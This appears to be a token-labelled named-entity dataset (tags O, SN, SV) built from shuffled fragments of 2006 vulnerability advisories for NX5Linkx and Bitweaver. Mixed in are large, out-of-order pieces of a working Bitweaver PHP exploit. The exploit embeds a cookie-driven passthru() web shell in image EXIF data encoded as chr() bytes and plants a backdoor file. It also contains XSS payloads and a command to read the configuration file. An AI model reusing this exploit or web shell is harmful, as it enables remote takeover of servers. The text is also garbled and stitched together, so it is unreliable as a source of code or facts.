response O
splitting O
vulnerabilities O
in O
SHOP-SCRIPT O

CRLF O
injection O
vulnerability O
in O
links.php O
in O
NX5Linx SN
1.0 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
CRLF O
sequence O
in O
the O
url O
parameter O
. O

Vendor O
: O
NX5 O

Vulnerable O
Script O
: O
link.php O
Parameter O
url O
is O
not O
properly O
sanitized O
. O

New O
eVuln O
Advisory O
: O
NX5Linkx O
Multiple O
Vulnerabilities O
Summary O
eVuln O
ID O
: O
EV0138 O
CVE O
: O
CVE-2006-4503 O
CVE-2006-4504 O
CVE-2006-4505 O

Credit O
Discovered O
by O
: O
Aliaksandr O
Hartsuyeu O
( O
eVuln.com O
) O
Regards O
, O
Aliaksandr O
Hartsuyeu O
- O
Penetration O
Testing O
Services O
. O

This O
can O
be O
used O
to O
make O
HTTP O
Response O
Splitting O
attack O
. O

First O
- O
( O
a O
) O
displays O
links O
list O
. O

This O
directory O
is O
available O
from O
the O
web O
. O

It O
used O
as O
full O
local O
path O
to O
logo O
filename O
. O

PoC/Exploit O
Available O
at O
: O
Solution O
No O
Patch O
available O
. O

Second O
- O
( O
b O
) O
out O
script O
which O
do O
the O
redirections O
when O
someone O
clicks O
on O
link O
Parameters O
c O
( O
script O
a O
) O
, O
l O
( O
script O
b O
) O
are O
not O
properly O
sanitized O
before O
being O
used O
in O
SQL O
query O
. O

Script O
do O
the O
copy O
of O
this O
file O
in O
logos O
directory O
. O

Vulnerable O
scripts O
: O
The O
name O
of O
those O
scripts O
are O
defined O
by O
webmaster O
. O

Multiple O
SQL O
Injections O
. O

This O
can O
be O
used O
to O
read O
arbitrary O
files O
. O

Arbitrary O
file O
disclosure O
Vulnerability O

This O
can O
be O
used O
to O
make O
any O
SQL O
query O
or O
make O
a O
HTTP O
response-splitting O
attack O
by O
injecting O
arbitrary O
SQL O
code O
. O

No O
reply O
from O
developer O
( O
s O
) O
PoC/Exploit O
: O
Available O
Solution O
: O
Not O
Available O
Discovered O
by O
: O
Aliaksandr O
Hartsuyeu O
( O
eVuln.com O
) O
Description O
1 O
. O

Vendor O
Web O
Site O
: O
Software O
: O
NX5Linkx O
Sowtware O
Web O
Site O
: O
Versions O
: O
1.0 SV
Critical O
Level O
: O
Dangerous O
Type O
: O
Multiple O
Vulnerabilities O
Class O
: O
Remote O
Status O
: O
Unpatched O
. O

Condition O
: O
magic_quotes_gpc O
= O
off O
3 O
. O

Vulnerable O
script O
: O
link.php O
Parameter O
logo O
is O
not O
properly O
sanitized O
. O

HTTP O
Response O
Splitting O
. O

[ O
eVuln O
] O
NX5Linkx O
Multiple O
Vulnerabilities O

CRLF O
injection O
vulnerability O
in O
Bitweaver SN
1.3 SV
allows O
remote O
attackers O
to O
conduct O
HTTP O
response O
splitting O
attacks O
by O
via O
CRLF O
sequences O
in O
multiple O
unspecified O
parameters O
that O
are O
injected O
into O
HTTP O
headers O
, O
as O
demonstrated O
by O
the O
BWSESSION O
parameter O
in O
index.php O
. O

proxy O
ock=fsockopen O
( O
$ O
parts O
, O
$ O
parts O
) O
; O
if O
( O
! O
$ O
ock O
) O
{ O
echo O
No O
response O
from O
proxy O
... O
; O
die O
; O
} O
} O
fputs O
( O
$ O
ock O
, O
$ O
packet O
) O
; O
if O
( O
$ O
proxy O
html O
while O
( O
! O
feof O
( O
$ O
ock O
) O
) O
{ O
$ O
html.=fgets O
( O
$ O
ock O
else O
{ O
$ O
html O
while O
( O
( O
! O
feof O
( O
$ O
ock O
) O
) O
or O
( O
! O
eregi O
( O
chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
, O
$ O
html O
html.=fread O
( O
$ O
ock,1 O
fclose O
( O
$ O
ock O
) O
; O
debug O
echo O
. O
$ O
html O
; O
} O
function O
make_seed O
( O
) O
{ O
list O
( O
$ O
usec O
, O
$ O
sec O
) O
= O
explode O
microtime O
( O
) O
) O
; O
return O
( O
float O
) O
$ O
sec O
+ O
( O
( O
float O
) O
$ O
usec O
100000 O
) O
; O
} O
$ O
host= O
$ O
argv O
; O
$ O
path= O
$ O
argv O
; O
$ O
cmd= O
; O
$ O
port=80 O
; O
$ O
proxy= O
; O
for O
( O
$ O
i=3 O
; O
$ O
i O
< O
= O
$ O
argc-1 O
; O
$ O
i++ O
) O
{ O
$ O
temp= O
$ O
argv O
[ O
$ O
i O
] O
. O
$ O
argv O
[ O
$ O
i O

chr O
( O
0x24 O
) O
.chr O
( O
0x5f O
) O
.chr O
( O
0x43 O
) O
.chr O
( O
0x4f O
) O
.chr O
( O
0x4f O
) O
.chr O
( O
0x4b O
) O
.chr O
( O
0x49 O
) O
.ch O
r O
( O
0x45 O
) O
. O

.php.xxx O
file O
found O
if O
( O
! O
strstr O
( O
$ O
html O
, O
passthru O
) O
) O
not O
executed O
as O
php O
code O
{ O
echo O
Exploit O
succeeded O
temp=explode O
( O
delim O
, O
$ O
html O
) O
; O
die O
( O
$ O
temp O
) O
; O
} O
else O
{ O
echo O
Exploit O
failed O
fclose O
( O
$ O
ffpp O
) O
; O
if O
you O
are O
here O
... O
echo O
Exploit O
failed O

chr O
( O
0x29 O
) O
.chr O
( O
0x3b O
) O
.chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x66 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x75 O
) O
.ch O
r O
( O
0x74 O
) O
. O

; O
$ O
packet.= O
Cookie O
: O
cmd= O
. O
$ O
cmd O
. O

7d63b53760260 O
; O
$ O
packet= O
POST O
. O
$ O
p O
. O

chr O
( O
0x3e O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x29 O
) O
.chr O
( O
0x3b O
) O
.chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x66 O
) O
.ch O
r O
( O
0x63 O
) O
. O

chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x08 O
) O
.chr O
( O
0x09 O
) O
.chr O
( O
0xff O
) O
.ch O
r O
( O
0xc4 O
) O
. O

chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.ch O
r O
( O
0x00 O
) O
. O

chr O
( O
0x5f O
) O
.chr O
( O
0x6c O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x74 O
) O
.chr O
( O
0x28 O
) O
.ch O
r O
( O
0x30 O
) O
. O

: O
. O
$ O
port O
; O
die O
; O
} O
} O
else O
{ O
$ O
c O
= O
preg_match O
( O
$ O
proxy_regex O
, O
$ O
proxy O
) O
; O
if O
( O
! O
$ O
c O
) O
{ O
echo O
Not O
a O
valid O
proxy O
... O
; O
die O
; O
} O
$ O
parts=explode O
proxy O
) O
; O
echo O
Connecting O
to O
. O
$ O
parts O
parts O
. O

through O
cookies O
... O
$ O
packet.= O
Connection O
: O
Close O
; O
for O
( O
$ O
i=0 O
; O
$ O
i O
< O
=99 O
; O
$ O
i++ O
) O
{ O
sendpacketii O
( O
$ O
packet O
) O
; O
if O
( O
strstr O
( O
$ O
html O
, O
200 O
OK O
) O
) O
{ O
echo O
temp_suntzu O
. O
$ O
anumber O
. O

chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0xff O
) O
.chr O
( O
0xda O
) O
.chr O
( O
0x00 O
) O
.ch O
r O
( O
0x0c O
) O
. O

d O
{ O
1,3 O
} O
: O
d O
{ O
1,5 O
} O
b O
) O
; O
function O
sendpacketii O
( O
$ O
packet O
) O
{ O
global O
$ O
proxy O
, O
$ O
host O
, O
$ O
port O
, O
$ O
html O
, O
$ O
proxy_regex O
; O
if O
( O
$ O
proxy O
ock=fsockopen O
( O
gethostbyname O
( O
$ O
host O
) O
, O
$ O
port O
) O
; O
if O
( O
! O
$ O
ock O
) O
{ O
echo O
No O
response O
from O
. O
$ O
host O
. O

chr O
( O
0x78 O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x2c O
) O
.chr O
( O
0x37 O
) O
.chr O
( O
0x37 O
) O
.chr O
( O
0x37 O
) O
.chr O
( O
0x29 O
) O
.ch O
r O
( O
0x3b O
) O
. O

; O
remove O
the O
extension O
$ O
pFileHash O
[ O
dest_base_name O
tmpImageName O
; O
$ O
pFileHash O
[ O
max_width O
] O
= O
ARTICLE_TOPIC_THUMBNAIL_SIZE O
; O
$ O
pFileHash O
[ O
max_height O
] O
= O
ARTICLE_TOPIC_THUMBNAIL_SIZE O
; O
$ O
pFileHash O
[ O
type O
FILES O
[ O
article_image O
] O
[ O
type O
] O
; O
if O
( O
! O

! O
/usr/bin/php O
-q O
-d O
short_open_tag=on O
< O

localhost O
/bitweaver O
cat O
kernel/config_inc.php O
; O
echo O
php O
. O
$ O
argv O
. O

chr O
( O
0x63 O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x64 O
) O
.chr O
( O
0x5d O
) O
.chr O
( O
0x29 O
) O
.chr O
( O
0x3b O
) O
.chr O
( O
0x65 O
) O
.ch O
r O
( O
0x63 O
) O
. O

chr O
( O
0x29 O
) O
.chr O
( O
0x3b O
) O
.chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x68 O
) O
.chr O
( O
0x6d O
) O
.ch O
r O
( O
0x6f O
) O
. O

chr O
( O
0x20 O
) O
.chr O
( O
0x5c O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x2a O
) O
.chr O
( O
0x64 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x6c O
) O
.ch O
r O
( O
0x69 O
) O
. O

chr O
( O
0x03 O
) O
.chr O
( O
0x11 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0xff O
) O
.chr O
( O
0xc4 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x14 O
) O
.ch O
r O
( O
0x00 O
) O
. O

chr O
( O
0x74 O
) O
.chr O
( O
0x5f O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x61 O
) O
.chr O
( O
0x67 O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x63 O
) O
.ch O
r O
( O
0x5f O
) O
. O

chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.ch O
r O
( O
0xff O
) O
. O

chr O
( O
0x68 O
) O
.chr O
( O
0x6f O
) O
.chr O
( O
0x20 O
) O
.chr O
( O
0x5c O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x2a O
) O
.chr O
( O
0x64 O
) O
.ch O
r O
( O
0x65 O
) O
. O

.php.xxx O
HTTP/1.0 O
; O
$ O
packet.= O
User-Agent O
: O
GoogleBot/2.1 O
; O
$ O
packet.= O
Host O
: O
. O
$ O
host O
. O

chr O
( O
0x29 O
) O
.chr O
( O
0x3b O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x66 O
) O
.chr O
( O
0x20 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x67 O
) O
.ch O
r O
( O
0x65 O
) O
. O

; O
die O
; O
} O
if O
( O
$ O
proxy O
p= O
$ O
path O
; O
} O
else O
{ O
$ O
p= O
$ O
packet= O
GET O
. O
$ O
p O
. O

; O
$ O
packet.= O
Cookie O
: O
cmd= O
. O
$ O
cmd O
. O

chr O
( O
0x6f O
) O
.chr O
( O
0x72 O
) O
.chr O
( O
0x5f O
) O
.chr O
( O
0x72 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x6f O
) O
.ch O
r O
( O
0x72 O
) O
. O

chr O
( O
0x6d O
) O
.chr O
( O
0x2a O
) O
.chr O
( O
0x5c O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x3b O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x61 O
) O
.ch O
r O
( O
0x73 O
) O
. O

temp/articles/suntzu.php.xxx O
HTTP/1.0 O
; O
$ O
packet.= O
User-Agent O
: O
GoogleBot/2.1 O
; O
$ O
packet.= O
Host O
: O
. O
$ O
host O
. O

chr O
( O
0x70 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x6e O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x75 O
) O
.ch O
r O
( O
0x6e O
) O
. O

chr O
( O
0x5f O
) O
.chr O
( O
0x43 O
) O
.chr O
( O
0x4f O
) O
.chr O
( O
0x4f O
) O
.chr O
( O
0x4b O
) O
.chr O
( O
0x49 O
) O
.chr O
( O
0x45 O
) O
.ch O
r O
( O
0x5b O
) O
. O

chr O
( O
0x01 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.ch O
r O
( O
0x00 O
) O
. O

1 O
, O
$ O
_FILES O
[ O
article_image O
] O
[ O
name O
if O
( O
! O
is_dir O
( O
TEMP_PKG_PATH.ARTICLES_PKG_NAME O
mkdir O
( O
TEMP_PKG_PATH.ARTICLES_PKG_NAME O
) O
; O
} O
if O
( O
! O
move_uploaded_file O
( O
$ O
_FILES O
[ O
article_image O
] O
[ O
tmp_name O
] O
, O
$ O
tmpImagePath O
this- O
> O
mErrors O
[ O
article_image O
Error O
during O
attachment O
of O
article O
image O
; O
} O
else O
{ O
$ O
resizeFunc O
= O
( O
$ O
gBitSystem- O
> O
getPreference O
( O
image_processor O
) O
imagick O
) O

srand O
( O
make_seed O
( O
) O
) O
; O
$ O
anumber O
= O
rand O
( O
1,99999 O
) O
; O
$ O
data= O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
tk O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
article_id O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
preview_image_url O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
preview_image_path O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
title O
test O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
author_name O
test O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
article_type_id O
1 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
rating O
3 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
format_guid O
tikiwiki O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
edit O
test O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
preview O
Preview O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
publishDateInput O
1 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
publish_Month O
06 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
publish_Day O
15 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
publish_Year O
2006 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
publish_Hour O
22 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
publish_Minute O
33 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
expireDateInput O
1 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
expire_Month O
06 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
expire_Day O
15 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
expire_Year O
2007 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
expire_Hour O
22 O
7d63b53760260 O
Content-Disposition O
: O
form-data O
; O
name= O
expire_Minute O
33 O
7d63b53760260 O

chr O
( O
0x74 O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x6e O
) O
.chr O
( O
0x67 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x30 O
) O
.chr O
( O
0x29 O
) O
.ch O
r O
( O
0x3b O
) O
. O

chr O
( O
0x63 O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x64 O
) O
.chr O
( O
0x5d O
) O
.chr O
( O
0x3d O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x74 O
) O
.ch O
r O
( O
0x72 O
) O
. O

chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0xff O
) O
.chr O
( O
0xdb O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x43 O
) O
.ch O
r O
( O
0x01 O
) O
. O

chr O
( O
0x73 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x24 O
) O
.chr O
( O
0x66 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x2c O
) O
.chr O
( O
0x22 O
) O
.ch O
r O
( O
0x3c O
) O
. O

d O
{ O
1,3 O
} O
. O

chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x3f O
) O
.chr O
( O
0x3e O
) O
.chr O
( O
0xff O
) O
.chr O
( O
0xe0 O
) O
.chr O
( O
0x00 O
) O
.ch O
r O
( O
0x10 O
) O
. O

chr O
( O
0x74 O
) O
.chr O
( O
0x7a O
) O
.chr O
( O
0x75 O
) O
.chr O
( O
0x2e O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x68 O
) O
.chr O
( O
0x70 O
) O
.ch O
r O
( O
0x2e O
) O
. O

chr O
( O
0x73 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x74 O
) O
.chr O
( O
0x5f O
) O
.chr O
( O
0x74 O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x6d O
) O
.ch O
r O
( O
0x65 O
) O
. O

chr O
( O
0x78 O
) O
.chr O
( O
0x78 O
) O
.chr O
( O
0x78 O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x2c O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x77 O
) O
.ch O
r O
( O
0x22 O
) O
. O

original O
url O
: O

; O
$ O
packet.= O
Connection O
: O
Close O
; O
$ O
packet.= O
$ O
data O
; O
if O
( O
$ O
proxy O
ffpp=fsockopen O
( O
$ O
host O
, O
$ O
port O
) O
; O
} O
else O
{ O
$ O
parts=explode O
proxy O
) O
; O
$ O
ffpp=fsockopen O
( O
$ O
parts O
, O
$ O
parts O
) O
; O
} O
fputs O
( O
$ O
ffpp O
, O
$ O
packet O
) O
; O
we O
don O
t O
need O
output O
, O
quickly O
look O
for O
temporary O
file O
... O
$ O
packet= O
GET O
. O
$ O
p O
. O
temp/articles/temp_suntzu O
. O
$ O
anumber O
. O

You O
can O
submit O
a O
file O
like O
this O
, O
with O
double O
extension O
: O
suntzu1234.php.xxx O
a O
temporary O
copy O
of O
the O
file O
is O
created O
in O
temp/articles O
folder O
and O
renamed O
like O
this O
: O
temp_suntzu1234.php.xxx O
( O
see O
$ O
tmpImagePath O
argument O
... O
) O
you O
have O
about O
0.1 O
0.2 O
seconds O
to O
launch O
commands O
: O
) O
, O
because O
temporary O
file O
is O
deleted O
this O
works O
fine O
on O
most O
Apache O
servers O
... O
note O
: O
this O
folder O
is O
not O
properly O
protected O
, O
we O
have O
an O
.htaccess O
file O
like O
this O
: O
< O
FilesMatch O
.ph O
( O
p O
( O
3|4 O
) O
|tml O
) O
$ O
order O
deny O
, O
allow O
deny O
from O
all O
< O
/FilesMatch O
ii O
) O
two O
cross O
site O
scripting O
vulnerabilities O
: O
document.cookie O
) O
< O
/script O
alert O
( O
document.cookie O
) O
< O
/script O
iii O
) O
a O
trick O
to O
see O
bitweaver O
white O
screen O
of O
death O
: O
uuuuuuuu O
and O
disclose O
full O
application O
path O
, O
database O
table O
prefix O
, O
among O
other O
things O
... O
iv O
) O
various O
http O
response O
splitting O
vulnerabilities O
, O
this O
is O
one O
: O
headers O
] O
this O
is O
the O
exploit O
for O
i O
) O
, O
it O
creates O
a O
backdoor O
called O
suntzu.php.xxx O
in O
temp/articles O
when O
you O
succeed O
for O
the O
first O
time O
error_reporting O
( O
0 O
) O
; O
ini_set O
( O
max_execution_time O
,0 O
) O
; O
ini_set O
( O
default_socket_timeout O
,5 O
) O
; O

/articles/edit.php O
HTTP/1.0 O
; O
$ O
packet.= O
Accept O
: O
image/gif O
, O
image/x-xbitmap O
, O
image/jpeg O
, O
image/pjpeg O
, O
application/x-shockwave-flash O
packet.= O
Referer O
: O
$ O
packet.= O
Accept-Language O
: O
it O
; O
$ O
packet.= O
Content-Type O
: O
multipart/form-data O
; O
boundary= O
7d63b53760260 O
; O
$ O
packet.= O
Accept-Encoding O
: O
gzip O
, O
deflate O
; O
$ O
packet.= O
User-Agent O
: O
GoogleBot/2.1 O
; O
$ O
packet.= O
Host O
: O
. O
$ O
host O
. O

chr O
( O
0x64 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x6c O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x2a O
) O
.chr O
( O
0x22 O
) O
.ch O
r O
( O
0x3b O
) O
. O

chr O
( O
0x75 O
) O
.chr O
( O
0x2e O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x68 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x2e O
) O
.chr O
( O
0x78 O
) O
.ch O
r O
( O
0x78 O
) O
. O

; O
$ O
packet.= O
Content-Length O
: O
.strlen O
( O
$ O
data O
) O
. O

chr O
( O
0x3b O
) O
.chr O
( O
0x7d O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x68 O
) O
.chr O
( O
0x6f O
) O
.chr O
( O
0x20 O
) O
.ch O
r O
( O
0x22 O
) O
. O

temp_ O
. O
$ O
_FILES O
[ O
article_image O
] O
[ O
na O
me O
] O
; O
$ O
tmpImageName O
= O
preg_replace O
( O
/ O
( O
. O

chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
; O
this O
image O
has O
this O
code O
inside O
as O
EXIF O
metadata O
: O
< O
php O
error_reporting O
( O
0 O
) O
; O
set_time_limit O
( O
0 O
) O
; O
if O
( O
get_magic_quotes_gpc O
COOKIE O
[ O
cmd O
] O
=stripslashes O
( O
$ O
_COOKIE O
[ O
cmd O
] O
) O
; O
} O
echo O
delim O
; O
passthru O
( O
$ O
_COOKIE O
[ O
cmd O
] O
) O
; O
echo O
delim O
; O
$ O
fp=fopen O
( O
suntzu.php.xxx O
, O
w O
) O
; O
fputs O
( O
$ O
fp O
, O
< O
php O
error_reporting O
( O
0 O
) O
; O
set_time_limit O
( O
0 O
) O
; O
if O
( O
get_magic_quotes_gpc O
COOKIE O
[ O
cmd O
] O
=stripslashes O
( O
$ O
_COOKIE O
[ O
cmd O
] O
) O
; O
} O
echo O
delim O
; O
passthru O
( O
$ O
_COOKIE O
[ O
cmd O
] O
) O
; O
echo O
delim O
fclose O
( O
$ O
fp O
) O
; O
chmod O
( O
suntzu.php.xxx O
,777 O
) O
; O

chr O
( O
0x5d O
) O
.chr O
( O
0x29 O
) O
.chr O
( O
0x3b O
) O
.chr O
( O
0x7d O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x68 O
) O
.ch O
r O
( O
0x6f O
) O
. O

chr O
( O
0x6c O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x2a O
) O
.chr O
( O
0x5c O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x3b O
) O
.ch O
r O
( O
0x3f O
) O
. O

localhost O
ls O
-la O
-P1.1.1.1:80 O
; O
die O
; O
} O
software O
site O
: O
i O
) O
vulnerable O
code O
in O
articles/BitArticle.php O
near O
lines O
456-478 O
: O
... O
if O
( O
! O
empty O
( O
$ O
_FILES O
[ O
article_image O
] O
[ O
name O
store O
the O
image O
in O
temp/articles O
$ O
tmpImagePath O
= O
TEMP_PKG_PATH.ARTICLES_PKG_NAME O
. O

chr O
( O
0x73 O
) O
.chr O
( O
0x74 O
) O
.chr O
( O
0x68 O
) O
.chr O
( O
0x72 O
) O
.chr O
( O
0x75 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x5c O
) O
.ch O
r O
( O
0x24 O
) O
. O

chr O
( O
0x70 O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x29 O
) O
.chr O
( O
0x29 O
) O
.chr O
( O
0x20 O
) O
.chr O
( O
0x7b O
) O
.ch O
r O
( O
0x24 O
) O
. O

chr O
( O
0x00 O
) O
.chr O
( O
0x43 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.ch O
r O
( O
0x01 O
) O
. O

chr O
( O
0x69 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x6c O
) O
.chr O
( O
0x61 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x68 O
) O
.ch O
r O
( O
0x65 O
) O
. O

chr O
( O
0x2a O
) O
.chr O
( O
0x64 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x6c O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x2a O
) O
.ch O
r O
( O
0x22 O
) O
. O

liberty_imagick_resize_image O
: O
liberty_gd_resize_image O
; O
$ O
pFileHash O
[ O
ource_file O
tmpImagePath O
; O
$ O
pFileHash O
[ O
dest_path O
] O
= O
TEMP_PKG_NAME O
. O

chr O
( O
0x6c O
) O
.chr O
( O
0x6f O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x24 O
) O
.chr O
( O
0x66 O
) O
.ch O
r O
( O
0x70 O
) O
. O

chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x24 O
) O
.chr O
( O
0x66 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x3d O
) O
.chr O
( O
0x66 O
) O
.ch O
r O
( O
0x6f O
) O
. O

chr O
( O
0x4f O
) O
.chr O
( O
0x4b O
) O
.chr O
( O
0x49 O
) O
.chr O
( O
0x45 O
) O
.chr O
( O
0x5b O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x6d O
) O
.ch O
r O
( O
0x64 O
) O
. O

localhost O
/bitweaver O
ls O
-la O
-p81 O
; O
echo O
php O
. O
$ O
argv O
. O

chr O
( O
0xc4 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x15 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x00 O
) O
.ch O
r O
( O
0x00 O
) O
. O

chr O
( O
0x75 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x24 O
) O
.chr O
( O
0x5f O
) O
.chr O
( O
0x43 O
) O
.chr O
( O
0x4f O
) O
.chr O
( O
0x4f O
) O
.ch O
r O
( O
0x4b O
) O
. O

chr O
( O
0x5b O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x64 O
) O
.chr O
( O
0x5d O
) O
.chr O
( O
0x3d O
) O
.chr O
( O
0x73 O
) O
.ch O
r O
( O
0x74 O
) O
. O

chr O
( O
0x03 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x02 O
) O
.chr O
( O
0x11 O
) O
.chr O
( O
0x03 O
) O
.chr O
( O
0x11 O
) O
.ch O
r O
( O
0x00 O
) O
. O

chr O
( O
0x70 O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x29 O
) O
.chr O
( O
0x29 O
) O
.chr O
( O
0x20 O
) O
.chr O
( O
0x7b O
) O
.ch O
r O
( O
0x5c O
) O
. O

. O
$ O
result O
; O
} O
$ O
proxy_regex O
= O
( O
b O
d O
{ O
1,3 O
} O
. O

chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.ch O
r O
( O
0x01 O
) O
. O

chr O
( O
0x00 O
) O
.chr O
( O
0x14 O
) O
.chr O
( O
0x11 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.ch O
r O
( O
0x00 O
) O
. O

echo O
bitweaver O
< O
= O
v1.3 O
tmpImagePath O
attachment O
mod_mime O
exploit O
; O
echo O
by O
rgod O
rgod O
( O
at O
) O
autistici O
( O
dot O
) O
org O
[ O
email O
concealed O
] O
; O
echo O
site O
: O
echo O
dork O
: O
powered O
by O
bitweaver O
; O
if O
( O
$ O
argc O
< O
4 O
) O
{ O
echo O
Usage O
: O
php O
. O
$ O
argv O
. O

chr O
( O
0x65 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x5c O
) O
.chr O
( O
0x24 O
) O
.chr O
( O
0x5f O
) O
.chr O
